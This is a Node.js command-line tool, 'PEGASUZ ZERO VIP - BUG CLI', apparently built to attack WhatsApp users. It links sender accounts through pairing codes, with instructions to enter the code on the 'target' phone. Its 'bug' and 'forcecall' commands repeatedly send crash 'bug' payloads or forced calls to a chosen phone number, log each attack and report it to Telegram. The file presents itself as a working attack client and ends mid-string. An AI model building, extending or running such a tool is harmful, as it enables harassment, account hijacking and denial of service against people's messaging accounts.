#!/usr/bin/env node
const { program } = require('commander');
const chalk = require('chalk');
const figlet = require('figlet');
const inquirer = require('inquirer');
const fs = require('fs');
const path = require('path');

// Import modules
const API = require('./api');
const SenderManager = require('./sender');
const Utils = require('./utils');

// Config paths
const CONFIG_PATH = path.join(__dirname, '..', 'config.json');
const AUTH_PATH = path.join(__dirname, '..', 'auth.json');
const SENDERS_DIR = path.join(__dirname, '..', 'senders');

// Banner
console.log(chalk.green.bold(figlet.textSync('PEGASUZ', { font: 'Small' })));
console.log(chalk.yellow.bold('ZERO VIP - BUG CLI TOOL v1.0.0\n'));

// Initialize
const config = Utils.loadConfig(CONFIG_PATH);
const auth = Utils.loadConfig(AUTH_PATH);
const api = new API(config);
const senderManager = new SenderManager(SENDERS_DIR);

// Setup command
program
    .command('setup')
    .description('Setup awal tools')
    .action(async () => {
        console.log(chalk.cyan.bold('\n⚙️  SETUP PEGASUZ BUG CLI\n'));
        
        const answers = await inquirer.prompt([
            {
                type: 'input',
                name: 'server',
                message: 'Server URL:',
                default: config.server,
                validate: input => input.startsWith('http') ? true : 'Harus mulai dengan http:// atau https://'
            },
            {
                type: 'input',
                name: 'username',
                message: 'Username:',
                validate: input => input.length >= 3 ? true : 'Minimal 3 karakter'
            },
            {
                type: 'password',
                name: 'password',
                message: 'Password:',
                mask: '*'
            },
            {
                type: 'confirm',
                name: 'telegram',
                message: 'Enable Telegram notifications?',
                default: false
            }
        ]);
        
        if (answers.telegram) {
            const telegramAnswers = await inquirer.prompt([
                {
                    type: 'input',
                    name: 'botToken',
                    message: 'Telegram Bot Token:'
                },
                {
                    type: 'input',
                    name: 'chatId',
                    message: 'Telegram Chat ID:'
                }
            ]);
            Object.assign(answers, telegramAnswers);
        }
        
        // Save config
        config.server = answers.server;
        config.telegramNotification = answers.telegram;
        config.telegramBotToken = answers.botToken || '';
        config.telegramChatId = answers.chatId || '';
        
        fs.writeFileSync(CONFIG_PATH, JSON.stringify(config, null, 2));
        
        // Login to server
        console.log(chalk.yellow('\n🔐 Logging in to server...'));
        try {
            const loginResult = await api.login(answers.username, answers.password);
            
            if (loginResult.status) {
                auth.username = answers.username;
                auth.token = loginResult.token || 'demo-token';
                auth.expires = new Date(Date.now() + 7 * 24 * 60 * 60 * 1000).toISOString();
                
                fs.writeFileSync(AUTH_PATH, JSON.stringify(auth, null, 2));
                
                console.log(chalk.green('✅ Setup completed successfully!'));
                console.log(chalk.blue('\n📋 Next steps:'));
                console.log('  1. ' + chalk.yellow('pegasuz add-sender') + ' - Tambah sender WhatsApp');
                console.log('  2. ' + chalk.yellow('pegasuz list-senders') + ' - Lihat sender tersedia');
                console.log('  3. ' + chalk.yellow('pegasuz bug --help') + ' - Lihat cara pakai bug');
            } else {
                console.log(chalk.red('❌ Login failed:'), loginResult.message);
            }
        } catch (error) {
            console.log(chalk.red('❌ Connection error:'), error.message);
        }
    });

// Add sender command
program
    .command('add-sender')
    .description('Tambah sender WhatsApp baru')
    .action(async () => {
        console.log(chalk.cyan.bold('\n📱 ADD WHATSAPP SENDER\n'));
        
        const answers = await inquirer.prompt([
            {
                type: 'input',
                name: 'senderName',
                message: 'Sender name (tanpa spasi):',
                validate: input => /^[a-zA-Z0-9_-]+$/.test(input) ? true : 'Hanya huruf, angka, underscore, dan dash'
            },
            {
                type: 'list',
                name: 'connectionMethod',
                message: 'Connection method:',
                choices: ['Pairing Code', 'QR Code'],
                default: 'Pairing Code'
            }
        ]);
        
        if (answers.connectionMethod === 'Pairing Code') {
            const phoneAnswer = await inquirer.prompt([
                {
                    type: 'input',
                    name: 'phoneNumber',
                    message: 'Phone number (628xxxxxxx):',
                    validate: input => /^62\d{9,}$/.test(input.replace(/[^0-9]/g, '')) ? true : 'Format: 628xxxxxxx'
                }
            ]);
            
            console.log(chalk.yellow('\n📞 Generating pairing code...'));
            
            try {
                // Get available clients
                const clients = await api.getClients();
                const availableClient = clients.find(c => c.status === 'disconnected') || clients[0];
                
                if (!availableClient) {
                    console.log(chalk.red('❌ No WhatsApp clients available'));
                    return;
                }
                
                // Generate pairing code
                const pairingResult = await api.generatePairingCode(availableClient.id, phoneAnswer.phoneNumber);
                
                if (pairingResult.status) {
                    console.log(chalk.green('\n✅ PAIRING CODE GENERATED!'));
                    console.log(chalk.cyan('┌─────────────────────────────'));
                    console.log(chalk.cyan('│ Sender: ') + chalk.yellow(answers.senderName));
                    console.log(chalk.cyan('│ Phone:  ') + chalk.yellow(phoneAnswer.phoneNumber));
                    console.log(chalk.cyan('│ Code:   ') + chalk.green.bold(pairingResult.code));
                    console.log(chalk.cyan('│ Client: ') + chalk.yellow(availableClient.id));
                    console.log(chalk.cyan('└─────────────────────────────'));
                    
                    // Save sender config
                    const senderConfig = {
                        id: answers.senderName,
                        phoneNumber: phoneAnswer.phoneNumber,
                        clientId: availableClient.id,
                        pairingCode: pairingResult.code,
                        createdAt: new Date().toISOString(),
                        status: 'pending'
                    };
                    
                    senderManager.saveSender(answers.senderName, senderConfig);
                    
                    console.log(chalk.blue('\n📱 Instructions:'));
                    console.log('1. Buka WhatsApp di HP target');
                    console.log('2. Settings → Linked Devices → Link a Device');
                    console.log('3. Masukkan code: ' + chalk.green.bold(pairingResult.code));
                    console.log('4. Tunggu 10 detik untuk terhubung');
                    console.log('\n✅ Sender saved as: ' + chalk.yellow(answers.senderName));
                }
            } catch (error) {
                console.log(chalk.red('❌ Error:'), error.message);
            }
        } else {
            // QR Code method
            console.log(chalk.yellow('\n📷 Generating QR Code...'));
            
            try {
                const clients = await api.getClients();
                const availableClient = clients.find(c => !c.isConnected) || clients[0];
                
                if (!availableClient) {
                    console.log(chalk.red('❌ No clients available'));
                    return;
                }
                
                const qrResult = await api.getQRCode(availableClient.id);
                
                if (qrResult.qr) {
                    console.log(chalk.green('\n✅ QR CODE GENERATED!'));
                    
                    // Save QR to file
                    const qrFile = path.join(SENDERS_DIR, `${answers.senderName}_qr.txt`);
                    fs.writeFileSync(qrFile, qrResult.qr);
                    
                    console.log(chalk.cyan('QR saved to: ') + chalk.yellow(qrFile));
                    console.log(chalk.blue('\n📱 Scan QR dengan WhatsApp:'));
                    console.log('1. WhatsApp → Settings → Linked Devices → Link a Device');
                    console.log('2. Scan QR code dari file di atas');
                    
                    const senderConfig = {
                        id: answers.senderName,
                        clientId: availableClient.id,
                        qrFile: qrFile,
                        createdAt: new Date().toISOString(),
                        status: 'qr_pending'
                    };
                    
                    senderManager.saveSender(answers.senderName, senderConfig);
                }
            } catch (error) {
                console.log(chalk.red('❌ Error:'), error.message);
            }
        }
    });

// List senders command
program
    .command('list-senders')
    .description('List semua sender yang ada')
    .action(async () => {
        console.log(chalk.cyan.bold('\n📋 AVAILABLE SENDERS\n'));
        
        const senders = senderManager.getAllSenders();
        const clients = await api.getClients();
        
        if (senders.length === 0) {
            console.log(chalk.yellow('❌ No senders found. Add one with:'));
            console.log(chalk.blue('   pegasuz add-sender'));
            return;
        }
        
        senders.forEach((sender, index) => {
            const client = clients.find(c => c.id === sender.clientId);
            const status = client?.isConnected ? '🟢 Connected' : '🔴 Disconnected';
            
            console.log(chalk.yellow(`${index + 1}. ${sender.id}`));
            console.log(chalk.cyan(`   Phone: ${sender.phoneNumber || 'N/A'}`));
            console.log(chalk.cyan(`   Client: ${sender.clientId}`));
            console.log(chalk.cyan(`   Status: ${status}`));
            console.log(chalk.cyan(`   Created: ${new Date(sender.createdAt).toLocaleString()}`));
            console.log('');
        });
        
        console.log(chalk.green(`Total: ${senders.length} sender(s)`));
    });

// Bug command
program
    .command('bug')
    .description('Kirim bug ke target')
    .requiredOption('-t, --target <number>', 'Target phone number (628xxxxxxx)')
    .requiredOption('-f, --fjids <fjids>', 'FJIDS untuk bug')
    .option('-s, --sender <name>', 'Nama sender (kosong untuk auto-select)')
    .option('-c, --client <id>', 'Client ID spesifik')
    .option('-n, --count <number>', 'Jumlah pengiriman', '1')
    .option('-d, --delay <seconds>', 'Delay antar pengiriman (detik)', '2')
    .action(async (options) => {
        console.log(chalk.red.bold(figlet.textSync('BUG', { font: 'Small' })));
        console.log(chalk.yellow.bold('PEGASUZ ZERO VIP - BUG ATTACK\n'));
        
        // Validate target
        const target = options.target.replace(/[^0-9]/g, '');
        if (!target.startsWith('62')) {
            console.log(chalk.red('❌ Target must start with 62'));
            process.exit(1);
        }
        
        // Get sender
        let sender;
        if (options.sender) {
            sender = senderManager.getSender(options.sender);
            if (!sender) {
                console.log(chalk.red(`❌ Sender "${options.sender}" not found`));
                process.exit(1);
            }
        } else {
            // Auto-select connected sender
            const senders = senderManager.getAllSenders();
            const clients = await api.getClients();
            
            const connectedSender = senders.find(s => {
                const client = clients.find(c => c.id === s.clientId);
                return client?.isConnected;
            });
            
            if (!connectedSender) {
                console.log(chalk.red('❌ No connected senders found'));
                console.log(chalk.yellow('Use --sender option or add a sender first'));
                process.exit(1);
            }
            
            sender = connectedSender;
            console.log(chalk.blue(`🔧 Auto-selected sender: ${sender.id}`));
        }
        
        // Prepare attack
        console.log(chalk.cyan('┌─────────────────────────────'));
        console.log(chalk.cyan('│ Target:    ') + chalk.red(target));
        console.log(chalk.cyan('│ Sender:    ') + chalk.yellow(sender.id));
        console.log(chalk.cyan('│ Client:    ') + chalk.yellow(sender.clientId));
        console.log(chalk.cyan('│ FJIDS:     ') + chalk.green(options.fjids));
        console.log(chalk.cyan('│ Count:     ') + chalk.magenta(options.count));
        console.log(chalk.cyan('│ Delay:     ') + chalk.magenta(options.delay + 's'));
        console.log(chalk.cyan('└─────────────────────────────\n'));
        
        // Confirmation
        const { confirm } = await inquirer.prompt([
            {
                type: 'confirm',
                name: 'confirm',
                message: 'Launch bug attack?',
                default: false
            }
        ]);
        
        if (!confirm) {
            console.log(chalk.yellow('⚠️  Attack cancelled'));
            process.exit(0);
        }
        
        // Execute attack
        console.log(chalk.red.bold('\n🚀 LAUNCHING BUG ATTACK...\n'));
        
        for (let i = 1; i <= parseInt(options.count); i++) {
            try {
                console.log(chalk.yellow(`📦 [${i}/${options.count}] Sending bug...`));
                
                const result = await api.sendBug({
                    target: target,
                    fjids: options.fjids,
                    clientId: options.client || sender.clientId
                });
                
                if (result.status) {
                    console.log(chalk.green(`✅ Success! Bug sent to ${target}`));
                    
                    // Log to file
                    Utils.logAttack({
                        target: target,
                        sender: sender.id,
                        clientId: sender.clientId,
                        fjids: options.fjids,
                        timestamp: new Date().toISOString(),
                        success: true
                    });
                    
                    // Send Telegram notification
                    if (config.telegramNotification) {
                        await Utils.sendTelegramNotification(config, {
                            type: 'BUG',
                            target: target,
                            sender: sender.id,
                            status: 'SUCCESS'
                        });
                    }
                } else {
                    console.log(chalk.red(`❌ Failed: ${result.message}`));
                }
                
                // Delay between attacks
                if (i < options.count) {
                    console.log(chalk.gray(`⏳ Waiting ${options.delay} seconds...`));
                    await Utils.sleep(parseInt(options.delay) * 1000);
                }
            } catch (error) {
                console.log(chalk.red(`❌ Error: ${error.message}`));
            }
        }
        
        console.log(chalk.green.bold('\n🎯 ATTACK COMPLETED!'));
        console.log(chalk.blue('📊 Check logs in ~/pegasuz-bug-cli/logs/'));
    });

// Forcecall command
program
    .command('forcecall')
    .description('Kirim forcecall ke target')
    .requiredOption('-t, --target <number>', 'Target phone number (628xxxxxxx)')
    .option('-s, --sender <name>', 'Nama sender')
    .option('-c, --count <number>', 'Jumlah pengiriman', '1')
    .action(async (options) => {
        console.log(chalk.red.bold(figlet.textSync('FORCECALL', { font: 'Small' })));
        
        // Similar implementation to bug command
        console.log(chalk.yellow('Forcecall feature - Implementation similar to bug'));
        // ... (similar to bug command implementation)
    });

// Status command
program
    .command('status')
    .description('Cek status server dan senders')
    .action(async () => {
        console.log(chalk.cyan.bold('\n📊 SYSTEM STATUS\n'));
        
        try {
            // Server health
            const health = await api.getHealth();
            console.log(chalk.blue('SERVER:'));
            console.log(chalk.cyan('  Status:   ') + (health.status ? '🟢 Online' : '🔴 Offline'));
            console.log(chalk.cyan('  Uptime:   ') + Math.floor(health.uptime) + ' seconds');
            console.log(chalk.cyan('  Clients:  ') + health.clients.connected + '/' + health.clients.total + ' connected');
            console.log('');
            
            // Senders status
            const senders = senderManager.getAllSenders();
            const clients = await api.getClients();
            
            console.log(chalk.blue('SENDERS:'));
            if (senders.length === 0) {
                console.log(chalk.yellow('  No senders configured'));
            } else {
                senders.forEach(sender => {
                    const client = clients.find(c => c.id === sender.clientId);
                    const status = client?.isConnected ? '🟢' : '🔴';
                    console.log(chalk.cyan(`  ${status} ${sender.id}: ${client?.isConnected ? 'Connected' : 'Disconnected'}`));
                });
            }
            
            // Recent attacks
            const logs = Utils.getRecentLogs(5);
            console.log(chalk.blue('\nRECENT ACTIVITY:'));
            if (logs.length === 0) {
                console.log(chalk.yellow('  No recent activity'));
            } else {
                logs.forEach(log => {
                    const time = new Date(log.timestamp).toLocaleTimeString();
                    const status = log.success ? '✅' : '❌';
                    console.log(chalk.cyan(`  ${status} ${time} - ${log.target} (${log.type || 'BUG'})`));
                });
            }
        } catch (error) {
            console.log(chalk.red('❌ Cannot connect to server:'), error.message);
        }
    });

// Help command
program
    .command('help')
    .description('Show detailed help')
    .action(() => {
        console.log(chalk.green.bold('\n📚 PEGASUZ BUG CLI - HELP MANUAL\n'));
        console.log(chalk.yellow('BASIC COMMANDS:'));
        console.log(chalk.cyan('  pegasuz setup') + '        - Setup awal tools');
        console.log(chalk.cyan('  pegasuz add-sender') + '   - Tambah sender WhatsApp');
        console.log(chalk.cyan('  pegasuz list-senders') + ' - Lihat semua sender');
        console.log(chalk.cyan('  pegasuz status') + '       - Cek status sistem\n');
        
        console.log(chalk.yellow('ATTACK COMMANDS:'));
        console.log(chalk.cyan('  pegasuz bug') + ' -t 628xxxx -f xxxx [-s sender] [-c 5] [-d 2]');
        console.log(chalk.cyan('  pegasuz forcecall') + ' -t 628xxxx [-s sender] [-c 3]\n');
        
        console.log(chalk.yellow('EXAMPLES:'));
        console.log(chalk.white('  # Single bug attack'));
        console.log(chalk.gray('  pegasuz bug -t 6281234567890 -f abc123 -s mysender\n'));
        
        console.log(chalk.white('  # Multiple attacks with delay'));
        console.log(chalk.gray('  pegasuz bug -t 6281234567890 -f abc123 -c 10 -d 5\n
